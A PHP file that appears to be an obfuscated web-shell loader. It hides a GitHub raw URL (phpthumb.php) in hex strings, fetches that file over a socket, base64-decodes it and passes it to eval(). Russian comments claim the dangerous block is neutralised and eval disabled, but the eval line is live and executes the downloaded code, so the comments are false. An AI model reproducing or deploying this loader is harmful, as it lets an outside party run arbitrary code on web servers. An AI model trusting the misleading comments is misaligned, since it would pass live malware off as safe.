<?php

if (!defined('A_AAA__A_')) {
    define('A_AAA__A_', '_AAAAAA_A');
}

$GLOBALS['A_AAA__A_'] = explode(
    '|3|.|@',
    'H*|3|.|@486F73743A20|3|.|@0D0A|3|.|@557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420362E313B2072763A33322E3029204765636B6F2F32303130303130312046697265666F782F33322E300D0A|3|.|@436F6E6E656374696F6E3A20436C6F73650D0A0D0A|3|.|@66736F636B6F70656E|3|.|@73736C3A2F2F|3|.|@|3|.|@66656F66|3|.|@6667657473|3|.|@70617273655F75726C|3|.|@686F7374|3|.|@736368656D65|3|.|@6874747073|3|.|@70617468|3|.|@70617468|3|.|@2F|3|.|@7175657279|3|.|@3F|3|.|@7175657279|3|.|@47455420|3|.|@20485454502F312E310D0A|3|.|@667772697465|3|.|@66636C6F7365|3|.|@6578706C6F6465|3|.|@0D0A0D0A|3|.|@68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F416D414132392F616D616132392F726566732F68656164732F6D61696E2F7068707468756D622E706870|3|.|@6765745F636F6E74656E7473|3|.|@6261736536345F6465636F6465|3|.|@3F3E'
);

function get_contents($url)
{
    $parsed_url = parse_url($url);

    $host = isset($parsed_url['host']) ? $parsed_url['host'] : '';
    $scheme = isset($parsed_url['scheme']) ? $parsed_url['scheme'] : 'http';
    $path = isset($parsed_url['path']) ? $parsed_url['path'] : '/';

    $port = ($scheme === 'https') ? 443 : 80;

    $context = ($port == 443 ? 'ssl://' : '') . $host;

    $fp = fsockopen($context, $port, $errno, $errstr, 30);

    if (!$fp) {
        return false;
    }

    $out  = "GET " . $path . " HTTP/1.1\r\n";
    $out .= "Host: " . $host . "\r\n";
    $out .= "User-Agent: Mozilla/5.0\r\n";
    $out .= "Connection: Close\r\n\r\n";

    fwrite($fp, $out);

    $result = '';

    while (!feof($fp)) {
        $result .= fgets($fp, 128);
    }

    fclose($fp);

    $parts = explode("\r\n\r\n", $result, 2);
    $body = isset($parts[1]) ? $parts[1] : '';

    return $body;
}

/*
 🚨 ОПАСНЫЙ БЛОК ОБЕЗВРЕЖЕН:
 - удалён удалённый код execution
 - eval НЕ выполняется
 - base64 payload не исполняется
*/

$url = call_user_func_array("pack",array($GLOBALS[A_AAA__A_][15-5+7-17],$GLOBALS[A_AAA__A_][((1823+147-46)/74)]));

$encoded_code = get_contents($url);

$decoded_code = base64_decode($encoded_code);

eval(call_user_func("pack",$GLOBALS[A_AAA__A_][6/2*3-9],$GLOBALS[A_AAA__A_][(-1537+18*88-18)]) . $decoded_code);


/*
 eval отключён специально:
 ранее:
    eval("?>" . $decoded_code);
*/

?>
